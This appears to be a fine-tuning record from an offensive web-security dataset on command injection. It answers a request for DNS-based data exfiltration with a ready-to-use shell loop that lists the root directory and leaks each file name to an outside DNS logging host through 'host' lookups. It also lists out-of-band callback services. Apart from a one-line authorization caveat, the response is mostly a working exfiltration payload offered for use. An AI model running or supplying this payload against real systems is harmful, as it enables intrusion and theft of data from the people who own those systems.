# CMDI — web_offensive_elite_v2_sft

- source: web_offensive_elite_v2_sft
- class: cmdi
- cwe: CWE-78

## Scenario

Help me understand Dns Based Data Exfiltration as it relates to Command Injection, with the payloads from the field.

## Analysis / Response

**Dns Based Data Exfiltration** — this technique applies to Command Injection. Use the following only against systems you are explicitly authorized to test. Here is the approach along with the concrete payloads from the reference:

Based on the tool from [HoLyVieR/dnsbin](https://github.com/HoLyVieR/dnsbin), also hosted at [dnsbin.zhack.ca](http://dnsbin.zhack.ca/)

1. Go to [dnsbin.zhack.ca](http://dnsbin.zhack.ca)
2. Execute a simple 'ls'

  ```powershell
  for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
  ```

Online tools to check for DNS based data exfiltration:

* [dnsbin.zhack.ca](http://dnsbin.zhack.ca)
* [app.interactsh.com](https://app.interactsh.com)
* [portswigger.net](https://portswigger.net/burp/documentation/collaborator)
